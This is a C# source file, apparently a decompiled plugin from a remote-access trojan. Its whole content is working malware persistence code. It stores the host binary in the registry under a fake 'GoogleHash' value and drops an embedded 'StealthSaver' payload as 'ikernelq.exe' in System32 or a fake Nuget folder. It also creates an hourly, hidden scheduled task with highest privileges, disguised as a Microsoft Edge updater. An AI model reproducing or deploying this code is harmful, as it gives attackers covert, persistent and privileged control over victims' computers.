using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using Microsoft.Win32;
using Plugin.Properties;

namespace Plugin;

public class Plugin
{
	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		string? fileName = Process.GetCurrentProcess().MainModule.FileName;
		int num = 5242880;
		byte[] array = File.ReadAllBytes(fileName);
		if (array.Length > num)
		{
			byte[] array2 = new byte[num];
			Array.Copy(array, array2, num);
			array = array2;
		}
		using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\google"))
		{
			registryKey.SetValue("GoogleHash", array);
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			string text = "C:\\Windows\\System32\\ikernelq.exe";
			if (!File.Exists(text))
			{
				File.WriteAllBytes(text, Resource1.StealthSaver);
				Shell("schtasks /create /f /sc minute /mo 60 /tn \"MicrosoftEdgeupdateinstaller\" /tr \"" + text + "\" /RL HIGHEST", runas: true);
			}
			return;
		}
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Nuget\\ikernelq.exe";
		if (!File.Exists(text2))
		{
			if (!Directory.Exists(Path.GetDirectoryName(text2)))
			{
				Directory.CreateDirectory(Path.GetDirectoryName(text2));
			}
			File.WriteAllBytes(text2, Resource1.StealthSaver);
			Shell("schtasks /create /f /sc minute /mo 60 /tn \"MicrosoftEdgeupdateinstaller\" /tr \"" + text2 + "\"", runas: false);
		}
	}

	public static void Shell(string command, bool runas)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = "cmd";
		processStartInfo.Arguments = "/c " + command;
		if (runas)
		{
			processStartInfo.Verb = "runas";
		}
		processStartInfo.Arguments += " && exit";
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}
}
